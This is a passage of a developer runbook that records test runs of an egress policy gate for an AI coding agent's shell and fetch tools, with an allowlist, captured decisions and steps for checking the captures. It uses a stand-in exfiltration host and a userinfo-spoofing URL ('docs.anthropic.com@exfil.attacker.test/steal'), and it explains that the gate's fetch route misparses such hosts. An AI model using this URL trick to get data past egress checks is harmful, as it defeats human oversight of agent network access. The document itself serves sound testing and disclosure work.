    "reasoning": "This step was decided by AGT's stock policy bundle. Policy: egress_destination_not_allowed, from AGT's stock bundle (agt_stock). AGT reported: destination exfil.attacker.test not in allowlist [\"*.anthropic.com\", \"docs.example.com\"].",
    "reason_codes": [
      "egress_destination_not_allowed"
    ],
    "policy_references": [
      {
        "policy_id": "agt_stock",
        "rule_id": "egress_destination_not_allowed"
      }
    ]
  }
}
```

On the fetch route there is no such seam. `args.url` is the **first** entry in the gate's own
`default_destination_paths` — the same property section 1 celebrates as costing no code — so the
tool's argument reaches `host_of()` with nothing in between. Correcting the parse would mean
editing `policy/lib/egress.rego`, and *not editing a `.rego`* is this slice's central claim, held
mechanically by `bun run verify:pin`. So the fetch half is published rather than fixed. The same
half is also what keeps the middle row honest: `https://docs.anthropic.com@exfil.attacker.test/steal`
is denied on both routes, but before this change the shell route denied it for the host
`docs.anthropic.com@exfil.attacker.test` — right verdict, wrong host, which is not the same as
being decided about correctly.

### Every shell command that *mentions* a URL is decided about, and this allowlist denies most of them

The extractor takes the first absolute http(s) URL in the command line. It has no model of whether
the command *reaches* that URL — a URL in an `echo`, in a shell comment, or in a flag value the
command never dereferences looks exactly like a `curl` to it. The shipped allowlist has one
reachable entry, so in this deployment that reads as **deny any shell command mentioning a URL**:

```bash
ACS=http://localhost:8794/acs
n=0
while IFS= read -r c; do
  n=$((n+1))
  d=$(jq -cn --arg c "$c" --arg r "f0000000-0000-4000-8000-00000000000$n" '{jsonrpc:"2.0",id:1,method:"steps/toolCallRequest",params:{
      acs_version:"0.1.0",request_id:$r,timestamp:"2026-08-18T00:00:00Z",
      metadata:{agent_id:"demo",session_id:"5c9a4d21-7e83-4f06-9b1d-2a6c8e4f0d75"},
      payload:{tool:{name:"Bash"},arguments:{command:{value:$c}},raw_command:$c}}}' |
    curl -s -X POST "$ACS" -H 'content-type: application/json' -d @- |
    jq -r '.result.decision + " " + ((.result.reason_codes // []) | join(","))')
  printf '%-52s -> %s\n' "$c" "$d"
done <<'COMMANDS'
git clone https://github.com/openai/whisper
pip install -i https://pypi.org/simple requests
echo 'docs at https://example.org/readme'
npm install
ls -la
COMMANDS
```

```
git clone https://github.com/openai/whisper          -> deny egress_destination_not_allowed
pip install -i https://pypi.org/simple requests      -> deny egress_destination_not_allowed
echo 'docs at https://example.org/readme'            -> deny egress_destination_not_allowed
npm install                                          -> allow 
ls -la                                               -> allow 
```

The third row is the one to look at twice: an `echo` reaches nothing, and it is denied by an egress
gate. This is the opposite direction from the miss above — over-blocking rather than
under-blocking — and it is a **live operational consequence**, not a hypothetical: the Quickstart
tells a reader to copy the widened `settings.json`, and this repository's own `.claude/settings.json`
already carries it. Turn this on and the `git clone` and `pip install -i` above stop, with a policy
reason attached, in an ordinary working session.

Neither obvious re-tuning is taken, and both refusals are deliberate. Widening the allowlist is not
available: it is what every capture in this file is measured against, and editing it would
invalidate them. Narrowing the extractor to tell *reaches* from *mentions* means parsing shell —
quoting, substitution, redirection, `&&` chains — and an extractor that gets that wrong in the
permissive direction is strictly worse here, because the gate's miss direction is already allow.
So the direction is stated and captured rather than tuned, and the README's install step says it
where an operator will read it before turning the hook on.

Three more things this demo does not establish, stated for the same reason:

- **A command reaching two hosts has its first examined and the rest unexamined.** The gate takes
  one destination; the extractor takes the first match, not every match.
- **Widening the tool matcher governs the tools named in it and no others.** Claude Code dispatches
  many more. Each is a `tools:` registration plus a `policy_target_argument` row plus a matcher
  entry — additive, but not automatic.
- **A fetch's *output* is not governed at all.** Only the request gate's matcher widened. The
  result gate stays scoped to the shell tool, deliberately: the hookmap declares one output path
  per hook, a fetch result carries no `stdout`, and widening it would buy a fail-open on every
  fetch result in exchange for nothing, since no stock gate reads a fetch's output.

## 6. The pin

A fourth gate class went live, and no `.rego` changed.

```bash
bun run verify:pin
```

```
$ bash scripts/verify-pin.sh
bun test v1.3.14 (0d9b296a)

 5 pass
 0 fail
 37 expect() calls
Ran 5 tests across 1 file. [25.00ms]
```

Run three times from this tree. Everything above reproduces exactly except the bracketed elapsed
time, which is wall-clock: it read `29.00ms`, then the `25.00ms` above, then `24.00ms`. That is the
one field in this file a re-run is not expected to match.

That is not a local assertion: `scripts/verify-pin.sh` shallow-clones AGT at the ref `agt.lock`
pins, points `UPSTREAM_BUNDLE` at the clone's own `policy/lib`, and re-runs the byte-identity test,
which self-skips without that variable. It needs network, and it refuses to run without `trash`.

Everything this slice changed under `policy/`:

```bash
git diff be5ab38..HEAD --stat -- policy/
```

```
 policy/lib/data.json       |   3 ++
 policy/manifest.drift.yaml |  33 ++++++++++++-
 policy/manifest.yaml       | 121 ++++++++++++++++++++++++++++++++++++++-------
 3 files changed, 138 insertions(+), 19 deletions(-)
```

Two manifests and one config document. Not one line of the twenty-two `.rego` files in
`policy/lib` — eleven rule modules and their eleven upstream test modules.

## How to check these captures

Every block above says it is real. This section is how a reader stops taking that on trust, and it
is deliberately a procedure rather than a number — a claim that "the blocks were verified" is worth
exactly as much as the reader's willingness to believe it.

**1. Start the Guardian and re-run the ten `curl` commands.** The invocation is in *Setup common to
every section* above: `ACS_GUARDIAN_PORT=8791` with `ACS_ENVELOPE_LOG=.acs/v9-runbook.jsonl`. Each
`curl` in this file is complete and self-contained — fixed `request_id`s, fixed bodies, nothing
elided — so the responses are comparable field for field, not merely in shape. "Ten" counts the
numbered `curl` blocks of sections 1–5; the two §5 subsections added in the final review round
contribute their own requests on top, through the two `bash` loops printed there and one further
`curl` block, and those loops carry fixed `request_id`s for the same reason.

**2. Then check them against the Guardian's own record, not against your terminal scrollback.** The
envelope sink writes one JSONL line per envelope crossing the wire, in **both** directions, before
validation, at the log path the setup block names. So the file holds the request you sent and the
response the Guardian sent back, as the Guardian saw them:

```bash
jq -c 'select(.direction == "response") | .envelope' .acs/v9-runbook.jsonl | sort -u | jq .
```

`sort -u` is the point. Run the ten requests several times and the log grows, but the number of
*distinct* response envelopes must stay at ten — one per request — because every field that varies
run to run is fixed in the request bodies. Run the two §5 loops as well and the distinct count
rises by their requests and then stops rising, for the same reason and no other. That is what makes the log a check on this file rather
than an echo of it: it is written by the Guardian process, from the port named on its own command
line, and it cannot contain a response some other process gave.

Writing this file, six runs accumulated in that log — 120 lines, 60 request/response pairs,
**ten distinct response envelopes**, each byte-identical to a block above. `.acs/` is gitignored, so
your copy starts empty and fills as you run.

**3. The blocks that are not wire traffic** each name the command that produced them, right where
they appear: `git diff be5ab38..HEAD` for the two `policy/` blocks, `opa eval` for the `host_of`
rows, `bun run verify:pin` for the pin, and — for the policy-input block, the pre-slice `mapVerdict`
comparison and the missing-`by_tool`-row deny — a short script printed or described in full beside
its output.

**4. One field will not match, and only one:** `verify:pin`'s bracketed wall-clock time, which the
pin section already records varying across three runs. Everything else in this file is expected to
reproduce byte for byte, and a block that does not is a finding — about this file, or about the
tree it was captured from.

## What this file is, and is not

This file is the **evidence** — real runs against a Guardian started from commit `16a3ab0`, pasted
verbatim. It does not declare this slice's scope, what it commits to, or what it leaves open; that
declaration lives in [`slices/v9/README.md`](../../slices/v9/README.md) and, authoritatively, in
[`docs/shaping/acs-reference-impl-slices.md`](../shaping/acs-reference-impl-slices.md) §V9.

One thing the runbook does settle, because it would otherwise be assumed from the demo's shape:
**the two egress routes are a real distinction and not a cell of the conformance matrix.** That
matrix is 8 AGT intervention points × 5 AGT verdicts, both axes read off the pinned SDK's own
consts. There is no coordinate in it for a gate class and none for a route, and
`pre_tool_call × deny` already resolved `expressed` before this slice, from the patterns gate. So
the distinction is stated here and in §V9, where it is true, rather than encoded where it cannot
be held.

## Verify

```bash
bun test
bun run typecheck
bun run verify:pin        # re-clones AGT and byte-diffs the pinned bundle -- needs network
bun run conformance
```
